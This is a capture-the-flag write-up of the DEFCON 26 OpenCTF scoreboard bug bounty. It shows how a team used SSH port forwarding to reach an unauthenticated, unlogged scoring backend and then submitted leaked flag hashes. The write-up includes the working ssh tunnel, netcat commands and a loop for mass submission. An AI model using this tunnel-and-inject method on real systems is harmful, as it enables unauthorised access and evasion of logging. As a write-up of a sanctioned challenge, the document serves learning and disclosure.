Scoreboard Bug Bounty - 1337

- DEFCON 26 @Open_CTF

- 2018-08-11

- Solved by Neg9 [craSH, tecknicaltom, reidb]

> SCOREBOARD BUG BOUNTY IS OPEN. COME AT US BR0!!! V& OUT!!! https://scoreboard.openctf.com/scoreboardbugbounty-dd9dd662cb9895a2353f6c463120b9eb7fed2bfb

Scoreboard Server: scoreboard.openctf.com

The Scoreboard server is running an SSH server, which is the primary method teams use to interact with it. Each team has a shell account, and the users' shell is set to be `interact.py` from the above source archive.

There were several issues with the scoreboard system configuration, code, and how the organizers released the code, which when combined, resulted in the ability of a team to score all possible challenges for themselves without leaving any trace of doing so, and by not using the intended `interact.py` method of scoring.

- Issue 1: sshd is configured to allow port forwarding/dynamic proxying.

- Issue 2: `collect_keys.py` accepts connections without authentication, and it does not log connections made to it to syslog like `interact.py` does.

- Issue 3: The included SQLite database (`central.db`) included all (SHA512) hashes of the flags. This hash value is what the backend `collect_keys.py` takes in addition to team name and challenge ID to register a scoring event.

As such, you can directly connect to the backend and submit a known hash for a question to a team.

One could connect to the scoreboard as such to open a socket on the players local machine on port 41337 which is a tunnel to the backend service `collect_keys.py` running on the scoreboard:

    ssh -L41337:localhost:41337 neg9@scoreboard.openctf.com

And in another terminal, one could then connect to the `collect_keys.py` service as follows:

    nc localhost 41337

This would yield the service authentication string (lol) and wait to be written to:

    lol goatse

At this point, the service expects a scoring event message in the following format:

    <Team_Name>,<Question_ID>,<Flag_SHA512_Hex>

For example - here is the string to submit to score question ID 15 (this scoreboard bug bounty challenge) for team neg9:

    neg9,15,40a2475624d82487a9ded98fc661fd9dde15e02973a5280a8b4b76fc81e41a123190604848fa1d23b181a17b3303e184588211b81bef71e58ef8e26b7f300eb6

As we have all hashes in the database provided, we can script up scoring for all questions. Here is the database schema:

    CREATE TABLE questions(challenge_name text, tags text, point_value integer, answer_hash text, question text, solved integer, open integer, qualification);
    CREATE TABLE team_score(team_name text, challenge_name text, point_value integer, answer_hash text, time_solved text, first integer, PRIMARY KEY(team_name, challenge_name, point_value, answer_hash) ON CONFLICT IGNORE);

And for demonstration, here is the row for this challenge:

    sqlite> select * from questions where challenge_name like '%bug%';
    Scoreboard Bug Bounty|Kajer scoreboard|1337|40a2475624d82487a9ded98fc661fd9dde15e02973a5280a8b4b76fc81e41a123190604848fa1d23b181a17b3303e184588211b81bef71e58ef8e26b7f300eb6|Find an 0-day in our scoreboard. Source is here: https://pastebin.com/nVR8gEih

We expeditiously grabbed all of the hashes from the dump and put them in a file to work with.

The following nested for loop would submit all hashes for neg9 (we extracted just the hash values and placed them in hashes.txt):

    for hash in $(cat hashes.txt); do for id in {1..100}; do echo "neg9,${id},${hash}" | nc localhost 41337; done ; done

We made a POC of this with the question ID 15, for the scoreboard bug bounty, and we were successfully awarded **1337** points. The organizers quickly disabled SSH port forwarding/tunneling at this point, and we were not able to score for the other flags in this manner. Good work :)
